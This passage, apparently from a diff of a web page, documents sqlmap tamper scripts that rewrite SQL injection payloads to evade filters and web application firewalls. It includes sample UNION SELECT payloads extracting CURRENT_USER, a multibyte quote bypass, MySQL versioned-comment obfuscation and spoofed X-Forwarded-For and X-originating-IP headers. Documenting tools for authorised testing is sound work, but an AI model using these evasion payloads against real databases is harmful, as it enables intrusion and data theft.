     &#39;1 AND 9227=9227-- sp_password&#39;
-
 </code></pre><h3 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py:"></a>symboliclogical.py:</h3><pre><code>Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)
     &quot;1 %26%26 &#39;1&#39;=&#39;1&quot;
-
 </code></pre><h3 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py:"></a>unionalltounion.py:</h3><pre><code>Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;-1 UNION ALL SELECT&#39;)
     &#39;-1 UNION SELECT&#39;
-
 </code></pre><h3 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py:"></a>unmagicquotes.py:</h3><pre><code>Replaces quote character (&#39;) with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1&#39; AND 1=1&quot;)
     &#39;1%bf%27-- -&#39;
-
 </code></pre><h3 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py:"></a>uppercase.py:</h3><pre><code>Replaces each keyword character with upper case value (e.g. select -&gt; SELECT)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;insert&#39;)
     &#39;INSERT&#39;
-
 </code></pre><h3 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py:"></a>varnish.py:</h3><pre><code>Appends a HTTP header &#39;X-originating-IP&#39; to bypass Varnish Firewall
 </code></pre><pre><code>Examples:
 &gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)
@@ -764,11 +708,9 @@
 </code></pre><h3 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py:"></a>versionedkeywords.py:</h3><pre><code>Encloses each non-function keyword with (MySQL) versioned comment
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)
     &#39;1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#&#39;
-
 </code></pre><h3 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py:"></a>versionedmorekeywords.py:</h3><pre><code>Encloses each keyword with (MySQL) versioned comment
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#&#39;)
     &#39;1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#&#39;
-
 </code></pre><h3 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py:"></a>xforwardedfor.py:</h3><pre><code>Append a fake HTTP header &#39;X-Forwarded-For&#39;
 </code></pre><pre><code>headers = kwargs.get(&quot;headers&quot;, {})
 headers[&quot;X-Forwarded-For&quot;] = randomIP()
